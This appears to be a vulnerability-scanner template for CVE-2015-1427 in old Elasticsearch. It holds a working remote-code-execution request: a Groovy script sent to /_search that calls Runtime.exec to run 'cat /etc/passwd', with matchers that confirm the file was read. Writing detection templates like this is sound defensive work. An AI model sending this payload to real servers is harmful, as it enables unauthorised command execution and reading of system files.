id: CVE-2015-1427
info:
  author: pikpikcu
  description: The Groovy scripting engine in Elasticsearch before 1.3.8 and 1.4.x
    before 1.4.3 allows remote attackers to bypass the sandbox protection mechanism
    and execute arbitrary shell commands via a crafted script.
  name: ElasticSearch 1.4.0/1.4.2 RCE
  reference: '- https://blog.csdn.net/JiangBuLiu/article/details/94457980

    - http://www.elasticsearch.com/blog/elasticsearch-1-4-3-1-3-8-released/

    '
  severity: critical
  tags: cve,cve2015,elastic,rce
requests:
- matchers:
  - part: header
    type: word
    words:
    - application/json
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - "POST /website/blog/ HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nAccept-Language:\
    \ en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64;\
    \ Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\n\
    Content-Length: 343\n\n{\n  \"name\": \"test\"\n}\n"
  - 'POST /_search HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    Accept-Language: en

    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

    Connection: close

    Content-Type: application/x-www-form-urlencoded

    Content-Length: 343


    {"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat
    /etc/passwd\").getText()"}}}

    '
